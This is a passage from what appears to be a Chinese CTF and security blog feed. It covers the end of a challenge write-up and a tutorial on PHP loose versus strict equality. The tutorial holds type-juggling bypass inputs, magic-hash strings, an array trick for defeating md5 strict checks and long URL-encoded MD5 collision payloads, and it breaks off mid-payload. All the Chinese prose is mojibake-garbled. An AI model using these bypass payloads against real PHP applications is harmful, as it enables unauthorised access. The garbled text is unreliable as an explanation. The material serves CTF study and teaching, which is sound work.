&#125;<br></code></pre></td></tr></table></figure><p>å…ˆæ³¨å†Œä¸€ä¸‹ï¼š</p><p><img src="/img/a21.png" alt="a21"></p><p>ä½†æç¤ºadminå·²ç»è¢«æ³¨å†Œè¿‡äº†ï¼Ÿå¼±å£ä»¤è¯•äº†æŒºå¤šä½†æ²¡å•¥ç”¨ï¼Œç™»ä¸ä¸Šå»ã€‚é‚£å°±éšä¾¿æ³¨å†Œä¸€ä¸ªï¼š</p><p><img src="/img/a22.png" alt="a22"></p><p>ç™»å½•åå‘ç°è·³è½¬åˆ°è¿™ä¹ˆä¸ªç•Œé¢:è¿™ç©æ„å„¿è·Ÿä¸ªå¤è¯»æœºä¼¼çš„ï¼Œä½ æ‰“å•¥ä¸œè¥¿ä»–å°±æŠŠ<code>ä½ </code>å’Œ<code>æ‚¨</code>æ¢æˆ<code>æˆ‘</code>ã€‚<code>å—</code>ç»™æ¢æˆç©ºæ ¼ï¼Œ<code>?</code>æ¢æˆ<code>!</code>ã€‚è€Œä¸”è¿™ä¸œè¥¿ä¸ç”¨æ•°æ®åŒ…(???)ï¼ŒburpsuiteæŠ“åŒ…æ ¹æœ¬æ²¡ç”¨ã€‚ã€‚</p><p>å®ƒè·³è½¬çš„æ—¶å€™æƒ³åˆ°äº†302é‡å®šå‘çš„é—®é¢˜ï¼Œå°±ä¸€ç›´å¼€ç€burpsuiteæ’æŸ¥ï¼Œå‘ç°è¿™ä¹ˆä¸ªä¸œè¥¿ï¼š</p><p><img src="/img/a23.png" alt="a23"></p><p>ç»“æœé‚£ä¸ªbvæ˜¯è¿™ä¹ˆä¸ªä¸œè¥¿ï¼š</p><p><img src="/img/a24.png" alt="a24"></p><p>çœ‹è¿™æ ‡é¢˜æˆ‘å°±æ„Ÿè§‰ä¸å¯¹åŠ²äº†ï¼Œç¿»ç®€ä»‹çš„æ—¶å€™æ ¹æœ¬æ²¡æœ‰ç¬¬ä¸ƒè¡Œã€‚ã€‚(#$$#$%^$#@#$%$#@@#$%^&amp;)ã€‚</p><p>å¦‚æœæ˜¯SQLæ³¨å…¥çš„è¯ï¼Œä¸çŸ¥é“æ³¨å…¥ç‚¹åœ¨å“ªé‡Œã€‚è¯•äº†æŒºå¤šå¼±å£ä»¤ä¹Ÿæ²¡è¯•å‡ºæ¥ã€‚ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs PHP"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;e_v.a.l&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span><span class="hljs-string">&quot;hello&quot;</span>;<br>&#125; <br><span class="hljs-meta">?&gt;</span><br>   <br><span class="hljs-comment">//e[v.a.l=11</span><br></code></pre></td></tr></table></figure><p>æ„Ÿè°¢mochuå¸ˆå‚…çš„æ–‡ç« ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/mochu7777777/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">115050295</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHPä¸­çš„å¼±ç›¸ç­‰å’Œå¼ºç›¸ç­‰</title>
    <link href="/2023/09/11/%5B%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93%5Dphp%E4%B8%AD%E7%9A%84%E5%BC%B1%E7%9B%B8%E7%AD%89%E5%92%8C%E5%BC%BA%E7%9B%B8%E7%AD%89/"/>
    <url>/2023/09/11/%5B%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93%5Dphp%E4%B8%AD%E7%9A%84%E5%BC%B1%E7%9B%B8%E7%AD%89%E5%92%8C%E5%BC%BA%E7%9B%B8%E7%AD%89/</url>
    
    <content type="html"><![CDATA[<p>å…¥é—¨çº§ç†è§£ï¼Œæ²¡å•¥å«é‡‘é‡:)</p><span id="more"></span><hr><p>æœ¬äººçš„ä¸€ç‚¹æ‹™è§ã€‚</p><p>å…ˆçœ‹ä¸‹GPTå¯¹å¼±ç›¸ç­‰å’Œå¼ºç›¸ç­‰çš„è§£é‡Šï¼š</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs abnf">åœ¨PHPä¸­ï¼Œå¼±ç›¸ç­‰ï¼ˆ<span class="hljs-operator">=</span><span class="hljs-operator">=</span>ï¼‰å’Œå¼ºç›¸ç­‰ï¼ˆ<span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span>ï¼‰æ˜¯ç”¨äºæ¯”è¾ƒä¸¤ä¸ªå€¼çš„æ“ä½œç¬¦ï¼Œå®ƒä»¬æœ‰ä»¥ä¸‹åŒºåˆ«ï¼š<br><br>    <span class="hljs-number">1</span>.å¼±ç›¸ç­‰ï¼ˆ<span class="hljs-operator">=</span><span class="hljs-operator">=</span>ï¼‰ï¼šå¼±ç›¸ç­‰ç”¨äºæ¯”è¾ƒä¸¤ä¸ªå€¼æ˜¯å¦ç›¸ç­‰ï¼Œä¸è€ƒè™‘å€¼çš„æ•°æ®ç±»å‹ã€‚å¦‚æœä¸¤ä¸ªå€¼åœ¨è½¬æ¢åç›¸ç­‰ï¼Œåˆ™è¿”å›trueï¼Œå¦åˆ™è¿”å›falseã€‚å¼±ç›¸ç­‰ä¼šè‡ªåŠ¨è¿›è¡Œç±»å‹è½¬æ¢ï¼Œä¾‹å¦‚å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºæ•°å­—è¿›è¡Œæ¯”è¾ƒã€‚<br><br>    <span class="hljs-number">2</span>.å¼ºç›¸ç­‰ï¼ˆ<span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span>ï¼‰ï¼šå¼ºç›¸ç­‰ç”¨äºæ¯”è¾ƒä¸¤ä¸ªå€¼æ˜¯å¦ç›¸ç­‰ï¼Œä¸”è¦æ±‚ä¸¤ä¸ªå€¼çš„æ•°æ®ç±»å‹ä¹Ÿç›¸åŒã€‚é™¤äº†æ¯”è¾ƒå€¼æ˜¯å¦ç›¸ç­‰å¤–ï¼Œè¿˜è¦æ±‚æ¯”è¾ƒçš„ä¸¤ä¸ªå€¼çš„æ•°æ®ç±»å‹ä¹Ÿç›¸åŒã€‚å¦‚æœå€¼å’Œæ•°æ®ç±»å‹éƒ½ç›¸ç­‰ï¼Œåˆ™è¿”å›trueï¼Œå¦åˆ™è¿”å›falseã€‚å¼ºç›¸ç­‰ä¸ä¼šè¿›è¡Œè‡ªåŠ¨ç±»å‹è½¬æ¢<br></code></pre></td></tr></table></figure><p>åœ¨å¼±ç›¸ç­‰æ¯”è¾ƒä¸­ï¼Œ<code>ä¸è€ƒè™‘æ•°æ®ç±»å‹</code>ï¼Œ<code>è½¬æ¢å</code>ç›¸ç­‰è¿”å›<code>true</code>,å¦åˆ™è¿”å›<code>false</code>ã€‚æ‰€ä»¥æ•´å‹ã€æµ®ç‚¹å‹ã€å­—ç¬¦ä¸²ã€å¸ƒå°”å‹ç­‰å‡å¯æ¯”è¾ƒï¼Œæ¯”å¦‚ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-comment">//å­—ç¬¦ä¸²å’Œæ•´å‹æˆ–æµ®ç‚¹å‹æ¯”è¾ƒï¼Œå­—ç¬¦ä¸²è‹¥ä»¥æ•°å­—å¼€å¤´åˆ™ä»å¼€å¤´æˆªå–åˆ°å­—æ¯å‡ºç°çš„ä½ç½®ï¼š</span><br><span class="hljs-string">&#x27;111&#x27;</span> == <span class="hljs-number">111</span> <span class="hljs-comment">//True</span><br><span class="hljs-string">&#x27;111abc&#x27;</span> == <span class="hljs-number">111</span> <span class="hljs-comment">//True</span><br><span class="hljs-string">&#x27;111admin&#x27;</span> == <span class="hljs-number">111.000000</span> <span class="hljs-comment">//True</span><br><span class="hljs-string">&#x27;notbad3333&#x27;</span> == <span class="hljs-number">0</span> <span class="hljs-comment">//True</span><br><span class="hljs-comment">//å¸ƒå°”å‹ä¸å­—ç¬¦ä¸²å’Œæ•´å‹åŠæµ®ç‚¹å‹å‡å¯ç›¸äº’æ¯”è¾ƒï¼š</span><br>True == <span class="hljs-string">&#x27;hello world!&#x27;</span><span class="hljs-comment">//True</span><br>True == <span class="hljs-string">&#x27;123abc&#x27;</span> <span class="hljs-comment">//True,å­—ç¬¦ä¸²é‡Œé¢åªè¦ä¸æ˜¯å•ä¸ª0ï¼Œä»»ä½•ç»„åˆ(å“ªæ€•æ˜¯0.0)éƒ½ä¸Trueå¼±ç›¸ç­‰</span><br>True ==<span class="hljs-string">&#x27;0.0000&#x27;</span> <span class="hljs-comment">//True</span><br>False == <span class="hljs-number">0</span> <span class="hljs-comment">//True</span><br>False == <span class="hljs-number">0.0</span> <span class="hljs-comment">//True,0.0000ç­‰åŒç†</span><br>False == <span class="hljs-literal">null</span> <span class="hljs-comment">//True</span><br>False ==<span class="hljs-string">&#x27;0&#x27;</span><span class="hljs-comment">//True</span><br>False ==<span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-comment">//True</span><br>False ==<br><span class="hljs-comment">//ç§‘å­¦è®¡æ•°æ³•çš„ç›¸å…³æ¯”è¾ƒ,å¹¶æ‹“å±•åˆ°MD5åŠ å¯†æ¯”è¾ƒ</span><br><span class="hljs-number">0e333</span> == <span class="hljs-string">&#x27;0e111&#x27;</span><span class="hljs-comment">//True</span><br><span class="hljs-string">&#x27;0e321&#x27;</span>==<span class="hljs-string">&#x27;0e789&#x27;</span><span class="hljs-comment">//True</span><br><span class="hljs-comment">//æ¯”å¦‚ä¸¤ä¸ªä¸œè¥¿åŠ å¯†åå‡ä»¥0eå¼€å¤´ï¼Œé‚£ä»–ä»¬å°±æ˜¯å¼±ç›¸ç­‰çš„</span><br><span class="hljs-comment">//æ‹“å±•åˆ°is_numericçš„ç»•è¿‡ï¼Œå¾ˆç»å…¸çš„æ˜¯è®©ä½ è¾“å…¥ä¸€ä¸ªä¸œè¥¿(GETæˆ–POSTä¼ ï¼Œè¿™ä¸ªä¸œè¥¿ä¸èƒ½æ˜¯æ•°å­—å´è¦å¤§äºæˆ–å°äºæˆ–ç­‰äºæŸä¸ªç‰¹å®šçš„æ•°å­—)</span><br> <span class="hljs-comment">//æ³¨æ„è™½ç„¶`0==null==false`æˆç«‹ï¼Œä½†ä¸èƒ½å› ä¸º`&#x27;notbad3333&#x27; == 0`å°±æ¨å‡º`&#x27;notbad3333&#x27; == null/false`!</span><br></code></pre></td></tr></table></figure><p>åœ¨å¼ºç›¸ç­‰ä¸­ï¼Œä¸å…‰è¦æ±‚å€¼ç›¸ç­‰ç±»å‹è¿˜è¦ç›¸ç­‰ã€‚å¦‚æœæƒ³è¦ç»•è¿‡ä¸¤ä¸ªmd5çš„å¼ºç›¸ç­‰ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//æ•°ç»„æ³•</span><br><span class="hljs-meta">&lt;?php</span><br>    <br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;oh you find me!&quot;</span>;<br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> != <span class="hljs-variable">$b</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$b</span>)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><span class="hljs-comment">//å¯ç”¨GETä¼ ?a[]=a&amp;b[]=bï¼ŒMD5æ²¡æ³•ç»™æ•°ç»„åŠ å¯†ä¼šè¿”å›null(æŠ¥é”™)ï¼Œä½†è¿™æ—¶ä¸¤ä¸ªnullæ»¡è¶³äº†å¼ºç›¸ç­‰ã€‚</span><br><span class="hljs-comment">//ç¢°æ’æ³•:MD5è¢«è®¤ä¸ºæ˜¯ä¸å®‰å…¨çš„ï¼Œåˆ©ç”¨ç°æœ‰çš„MD5çš„å¼ºç¢°æ’è§£é¢˜</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//ä¸€äº›æ¯”è¾ƒå¸¸ç”¨çš„MD5å¼±æ¯”è¾ƒï¼š</span><br>QNKCDZO<br><span class="hljs-number">0e830400451993494058024219903391</span><br><span class="hljs-number">240610708</span><br><span class="hljs-number">0e462097431906509019562988736854</span><br>s878926199a<br><span class="hljs-number">0e545993274517709034328855841020</span><br>s155964671a<br><span class="hljs-number">0e342768416822451524974117254469</span><br>s214587387a<br><span class="hljs-number">0e848240448830537924465865611904</span><br><span class="hljs-comment">//MD5ç¡¬ç¢°æ’</span><br>a=%af%<span class="hljs-number">13</span>%<span class="hljs-number">76</span>%<span class="hljs-number">70</span>%<span class="hljs-number">82</span>%a0%a6%<span class="hljs-number">58</span>%cb%<span class="hljs-number">3</span>e%<span class="hljs-number">23</span>%<span class="hljs-number">38</span>%c4%c6%db%<span class="hljs-number">8</span>b%<span class="hljs-number">60</span>%<span class="hljs-number">2</span>c%bb%<span class="hljs-number">90</span>%<span class="hljs-number">68</span>%a0%<span class="hljs-number">2</span>d%e9%<span class="hljs-number">47</span>%aa%<span class="hljs-number">78</span>%<span class="hljs-number">49</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">0</span>a%c0%c0%<span class="hljs-number">31</span>%d3%fb%cb%<span class="hljs-number">82</span>%<span class="hljs-number">25</span>%<span class="hljs-number">92</span>%<span class="hljs-number">0</span>d%cf%<span class="hljs-number">61</span>%<span class="hljs-number">67</span>%<span class="hljs-number">64</span>%e8%cd%<span class="hljs-number">7</span>d%<span class="hljs-number">47</span>%ba%<span class="hljs-number">0</span>e%<span class="hljs-number">5</span>d%<span class="hljs-number">1</span>b%<span class="hljs-number">9</span>c%<span class="hljs-number">1</span>c%<span class="hljs-number">5</span>c%cd%<span class="hljs-number">07</span>%<span class="hljs-number">2</span>d%f7%a8%<span class="hljs-number">2</span>d%<span class="hljs-number">1</span>d%bc%<span class="hljs-number">5</span>e%<span class="hljs-number">2</span>c%<span class="hljs-number">06</span>%<span class="hljs-number">46</span>%<span class="hljs-number">3</span>a%<span class="hljs-number">0</span>f%<span class="hljs-number">2</span>d%<span class="hljs-number">4</span>b%e9%<span class="hljs-number">20</span>%<span class="hljs-number">1</span>d%<span class="hljs-number">29</span>%<span class="hljs-number">66</span>%a4%e1%<span class="hljs-number">8</span>b%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>c%f5%ef%<span class="hljs-number">97</span>%b6%ee%<span class="hljs-number">48</span>%dd%<span class="hljs-number">0</span>e%<span class="hljs-number">09</span>%aa%e5%<span class="hljs-number">4</span>d%<span class="hljs-number">6</span>a%<span class="hljs-number">5</span>d%<span class="hljs-number">6</span>d%<span class="hljs-number">75</span>%<span class="hljs-number">77</span>%<span class="hljs-number">72</span>%cf%<span class="hljs-number">47</span>%<span class="hljs-number">16</span>%a2%<span class="hljs-number">06</span>%<span class="hljs-number">72</span>%<span class="hljs-number">71</span>%c9%a1%<span class="hljs-number">8</span>f%<span class="hljs-number">00</span>%f6%<span class="hljs-number">9</span>d%ee%<span class="hljs-number">54</span>%<span class="hljs-number">27</span>%<span class="hljs-number">71</span>%be%c8%c3%<span class="hljs-number">8</span>f%<span class="hljs-number">93</span>%e3%<span class="hljs-number">52</span>%<span class="hljs-number">73</span>%<span class="hljs-number">73</span>%<span class="hljs-number">53</span>%a0%<span class="hljs-number">5</span>f%<span class="hljs-number">69</span>%ef%c3%<span class="hljs-number">3</span>b%ea%ee%<span class="hljs-number">70</span>%<span class="hljs-number">71</span>%ae%<span class="hljs-number">2</span>a%<span class="hljs-number">21</span>%c8%<span class="hljs-number">44</span>%d7%<span class="hljs-number">22</span>%<span class="hljs-number">87</span>%<span class="hljs-number">9</span>f%be%<span class="hljs-number">79</span>%<span class="hljs-number">6</span>d%c4%<span class="hljs-number">61</span>%a4%<span class="hljs-number">08</span>%<span class="hljs-number">57</span>%<span class="hljs-number">02</span>%<span class="hljs-number">82</span>%<span class="hljs-number">2</span>a%ef%<span class="hljs-number">36</span>%<span class="hljs-number">95</span>%da%ee%<span class="hljs-number">13</span>%bc%fb%<span class="hljs-number">7</span>e%a3%<span class="hljs-number">59</span>%<span class="hljs-number">45</span>%ef%<span class="hljs-number">25</span>%<span class="hljs-number">67</span>%<span class="hljs-number">3</span>c%e0%<span class="hljs-number">27</span>%<span class="hljs-number">69</span>%<span class="hljs-number">2</span>b%<span class="hljs-number">95</span>%<span class="hljs-number">77</span>%b8%cd%dc%<span class="hljs-number">4</span>f%de%<span class="hljs-number">73</span>%<span class="hljs-number">24</span>%e8%ab%<span class="hljs-number">66</span>%<span class="hljs-number">74</span>%d2%<span class="hljs-number">8</span>c%<span class="hljs-number">68</span>%<span class="hljs-number">06</span>%<span class="hljs-number">80</span>%<span class="hljs-number">0</span>c%dd%<span class="hljs-number">74</span>%ae%<span class="hljs-number">31</span>%<span class="hljs-number">05</span>%d1%<span class="hljs-number">15</span>%<span class="hljs-number">7</span>d%c4%<span class="hljs-number">5</span>e%bc%<span class="hljs-number">0</span>b%<span class="hljs-number">0</span>f%<span class="hljs-number">21</span>%<span class="hljs-number">23</span>%a4%<span class="hljs-number">96</span>%<span class="hljs-number">7</span>c%<span class="hljs-number">17</span>%<span class="hljs-number">12</span>%d1%<span class="hljs-number">2</span>b%b3%<span class="hljs-number">10</span>%b7%<span class="hljs-number">37</span>%<span class="hljs-number">60</span>%<span class="hljs-number">68</span>%d7%cb%<span class="hljs-number">35</span>%<span class="hljs-number">5</span>a%<span class="hljs-number">54</span>%<span class="hljs-number">97</span>%<span class="hljs-number">08</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">54</span>%<span class="hljs-number">78</span>%<span class="hljs-number">49</span>%d0%<span class="hljs-number">93</span>%c3%b3%fd%<span class="hljs-number">1</span>f%<span class="hljs-number">0</span>b%<span class="hljs-number">35</span>%<span class="hljs-number">11</span>%<span class="hljs-number">9</span>d%<span class="hljs-number">96</span>%<span class="hljs-number">1</span>d%ba%<span class="hljs-number">64</span>%e0%<span class="hljs-number">86</span>%ad%ef%<span class="hljs-number">52</span>%<span class="hljs-number">98</span>%<span class="hljs-number">2</span>d%<span class="hljs-number">84</span>%<span class="hljs-number">12</span>%<span class="hljs-number">77</span>%bb%ab%e8%<span class="hljs-number">64</span>%da%a3%<span class="hljs-number">65</span>%<span class="hljs-number">55</span>%<span class="hljs-number">5</span>d%d5%<span class="hljs-number">76</span>%<span class="hljs-number">55</span>%<span class="hljs-number">57</span>%<span class="hljs-number">46</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">89</span>%c9%df%b2%<span class="hljs-number">3</span>c%<span class="hljs-number">85</span>%<span class="hljs-number">97</span>%<span class="hljs-number">1</span>e%f6%<span class="hljs-number">38</span>%<span class="hljs-number">66</span>%c9%<span class="hljs-number">17</span>%<span class="hljs-number">22</span>%e7%ea%c9%f5%d2%e0%<span class="hljs-number">14</span>%d8%<span class="hljs-number">35</span>%<span class="hljs-number">4</span>f%<span class="hljs-number">0</span>a%<span class="hljs-number">5</span>c%<span class="hljs-number">34</span>%d3%<span class="hljs-number">73</span>%a5%<span class="hljs-number">98</span>%f7%<span class="hljs-number">66</span>%<span class="hljs-number">72</span>%aa%<span class="hljs-number">43</span>%e3%bd%a2%cd%<span class="hljs-number">62</span>%fd%<span class="hljs-number">69</span>%<span class="hljs-number">1</span>d%<span class="hljs-number">34</span>%<span class="hljs-number">30</span>%<span class="hljs-number">57</span>%<span class="hljs-number">52</span>%ab%<span class="hljs-number">41</span>%b1%<span class="hljs-number">91</span>%<span class="hljs-number">65</span>%f2%<span class="hljs-number">30</span>%<span class="hljs-number">7</span>f%cf%c6%a1%<span class="hljs-number">8</span>c%fb%dc%c4%<span class="hljs-number">8</span>f%<span class="hljs-number">61</span>%a5%<span class="hljs-number">93</span>%<span class="hljs-number">40</span>%<span class="hljs-number">1</span>a%<span class="hljs-number">13</span>%d1%<span class="hljs-number">09</span>%c5%e0%f7%<span class="hljs-number">87</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">48</span>%e7%d7%b3%<span class="hljs-number">62</span>%<span class="hljs-number">04</span>%a7%c4%cb%fd%f4%ff%cf%<span class="hljs-number">3</span>b%<span class="hljs-number">74</span>%<span class="hljs-number">28</span>%<span class="hljs-number">1</span>c%<span class="hljs-number">96</span>%<span class="hljs-number">8</span>e%<span class="hljs-number">09</span>%<span class="hljs-number">73</span>%<span class="hljs-number">3</span>a%<span class="hljs-number">9</span>b%a6%<span class="hljs-number">2</span>f%ed%b7%<span class="hljs-number">99</span>%d5%b9%<span class="hljs-number">05</span>%<span class="hljs-number">39</span>%<span class="hljs-number">95</span>%ab<br>&amp;b=%af%<span class="hljs-number">13</span>%<span class="hljs-number">76</span>%<span class="hljs-number">70</span>%<span class="hljs-number">82</span>%a0%a6%<span class="hljs-number">58</span>%cb%<span class="hljs-number">3</span>e%<span class="hljs-number">23</span>%<span class="hljs-number">38</span>%c4%c6%db%<span class="hljs-number">8</span>b%<span class="hljs-number">60</span>%<span class="hljs-number">2</span>c%bb%<span class="hljs-number">90</span>%<span class="hljs-number">68</span>%a0%<span class="hljs-number">2</span>d%e9%<span class="hljs-number">47</span>%aa%<span class="hljs-number">78</span>%<span class="hljs-number">49</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">0</span>a%c0%c0%<span class="hljs-number">31</span>%d3%fb%cb%<span class="hljs-number">82</span>%<span class="hljs-number">25</span>%<span class="hljs-number">92</span>%<span class="hljs-number">0</span>d%cf%<span class="hljs-number">61</span>%<span class="hljs-number">67</span>%<span class="hljs-number">64</span>%e8%cd%<span class="hljs-number">7</span>d%<span class="hljs-number">47</span>%ba%<span class="hljs-number">0</span>e%<span class="hljs-number">5</span>d%<span class="hljs-number">1</span>b%<span class="hljs-number">9</span>c%<span class="hljs-number">1</span>c%<span class="hljs-number">5</span>c%cd%<span class="hljs-number">07</span>%<span class="hljs-number">2</span>d%f7%a8%<span class="hljs-number">2</span>d%<span class="hljs-number">1</span>d%bc%<span class="hljs-number">5</span>e%<span class="hljs-number">2</span>c%<span class="hljs-number">06</span>%<span class="hljs-number">46</span>%<span class="hljs-number">3</span>a%<span class="hljs-number">0</span>f%<span class="hljs-number">2</span>d%<span class="hljs-number">4</span>b%e9%<span class="hljs-number">20</span>%<span class="hljs-number">1</span>d%<span class="hljs-number">29</span>%<span class="hljs-number">66</span>%a4%e1%<span class="hljs-number">8</span>b%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>c%f5%ef%<span class="hljs-number">97</span>%b6%ee%<span class="hljs-number">48</span>%dd%<span class="hljs-number">0</span>e%<span class="hljs-number">09</span>%aa%e5%<span class="hljs-number">4</span>d%<span class="hljs-number">6</span>a%<span class="hljs-number">5</span>d%<span class="hljs-number">6</span>d%<span class="hljs-number">75</span>%<span class="hljs-number">77</span>%<span class="hljs-number">72</span>%cf%<span class="hljs-number">47</span>%<span class="hljs-number">16</span>%a2%<span class="hljs-number">06</span>%<span class="hljs-number">72</span>%<span class="hljs-number">71</span>%c9%a1%<span class="hljs-number">8</span>f%<span class="hljs-number">00</span>%f6%<span class="hljs-number">9</span>d%ee%<span class="hljs-number">54</span>%<span class="hljs-number">27</span>%<span class="hljs-number">71</span>%be%c8%c3%<span class="hljs-number">8</span>f%<span class="hljs-number">93</span>%e3%<span class="hljs-number">52</span>%<span class="hljs-number">73</span>%<span class="hljs-number">73</span>%<span class="hljs-number">53</span>%a0%<span class="hljs-number">5</span>f%<span class="hljs-number">69</span>%ef%c3%<span class="hljs-number">3</span>b%ea%ee%<span class="hljs-number">70</span>%<span class="hljs-number">71</span>%ae%<span class="hljs-number">2</span>a%<span class="hljs-number">21</span>%c8%<span class="hljs-number">44</span>%d7%<span class="hljs-number">22</span>%<span class="hljs-number">87</span>%<span class="hljs-number">9</span>f%be%<span class="hljs-number">79</span>%<span class="hljs-number">6</span>d%c4%<span class="hljs-number">61</span>%a4%<span class="hljs-number">08</span>%<span class="hljs-number">57</span>%<span class="hljs-number">02</span>%<span class="hljs-number">82</span>%<span class="hljs-number">2</span>a%ef%<span class="hljs-number">36</span>%<span class="hljs-number">95</span>%da%ee%<span class="hljs-number">13</span>%bc%fb%<span class="hljs-number">7</span>e%a3%<span class="hljs-number">59</span>%<span class="hljs-number">45</span>%ef%<span class="hljs-number">25</span>%<span class="hljs-number">67</span>%<span class="hljs-number">3</span>c%e0%<span class="hljs-number">27</span>%<span class="hljs-number">69</span>%<span class="hljs-number">2</span>b%<span class="hljs-number">95</span>%<span class="hljs-number">77</span>%b8%cd%dc%<span class="hljs-number">4</span>f%de%<span class="hljs-number">73</span>%<span class="hljs-number">24</span>%e8%ab%<span class="hljs-number">66</span>%<span class="hljs-number">74</span>%d2%<span class="hljs-number">8</span>c%<span class="hljs-number">68</span>%<span class="hljs-number">06</span>%<span class="hljs-number">80</span>%<span class="hljs-number">0</span>c%dd%<span class="hljs-number">74</span>%ae%<span class="hljs-number">31</span>%<span class="hljs-number">05</span>%d1%<span class="hljs-number">15</span>%<span class="hljs-number">7</span>d%c4%<span class="hljs-number">5</span>e%bc%<span class="hljs-number">0</span>b%<span class="hljs-number">0</span>f%<span class="hljs-number">21</span>%<span class="hljs-number">23</span>%a4%<span class="hljs-number">96</span>%<span class="hljs-number">7</span>c%<span class="hljs-number">17</span>%<span class="hljs-number">12</span>%d1%<span class="hljs-number">2</span>b%b3%<span class="hljs-number">10</span>%b7%<span class="hljs-number">37</span>%<span class="hljs-number">60</span>%<span class="hljs-number">68</span>%d7%cb%<span class="hljs-number">35</span>%<span class="hljs-number">5</span>a%<span class="hljs-number">54</span>%<span class="hljs-number">97</span>%<span class="hljs-number">08</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">54</span>%<span class="hljs-number">78</span>%<span class="hljs-number">49</span>%d0%<span class="hljs-number">93</span>%c3%b3%fd%<span class="hljs-number">1</span>f%<span class="hljs-number">0</span>b%<span class="hljs-number">35</span>%<span class="hljs-number">11</span>%<span class="hljs-number">9</span>d%<span class="hljs-number">96</span>%<span class="hljs-number">1</span>d%ba%<span class="hljs-number">64</span>%e0%<span class="hljs-number">86</span>%ad%ef%<span class="hljs-number">52</span>%<span class="hljs-number">98</span>%<span class="hljs-number">2</span>d%<span class="hljs-number">84</span>%<span class="hljs-number">12</span>%<span class="hljs-number">77</span>%bb%ab%e8%<span class="hljs-number">64</span>%da%a3%<span class="hljs-number">65</span>%<span class="hljs-number">55</span>%<span class="hljs-number">5</span>d%d5%<span class="hljs-number">76</span>%<span class="hljs-number">55</span>%<span class="hljs-number">57</span>%<span class="hljs-number">46</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">89</span>%c9%<span class="hljs-number">5</span>f%b2%<span class="hljs-number">3</span>c%<span class="hljs-number">85</span>%<span class="hljs-number">97</span>%<span class="hljs-number">1</span>e%f6%<span class="hljs-number">38</span>%<span class="hljs-number">66</span>%c9%<span class="hljs-number">17</span>%<span class="hljs-number">22</span>%e7%ea%c9%f5%d2%e0%<span class="hljs-number">14</span>%d8%<span class="hljs-number">35</span>%<span class="hljs-number">4</span>f%<span class="hljs-number">0</span>a%<span class="hljs-number">5</span>c%<span class="hljs-number">34</span>%d3%f3%a5%<span class="hljs-number">98</span>%f7%<span class="hljs-number">66</span>%<span class="hljs-number">72</span>%aa%<span class="hljs-number">43</span>%e3%bd%a2%cd%<span class="hljs-number">62</span>%fd%e9%<span class="hljs-number">1</span>d%<span class="hljs-number">34</span>%<span class="hljs-number">30</span>%<span class="hljs-number">57</span>%<span 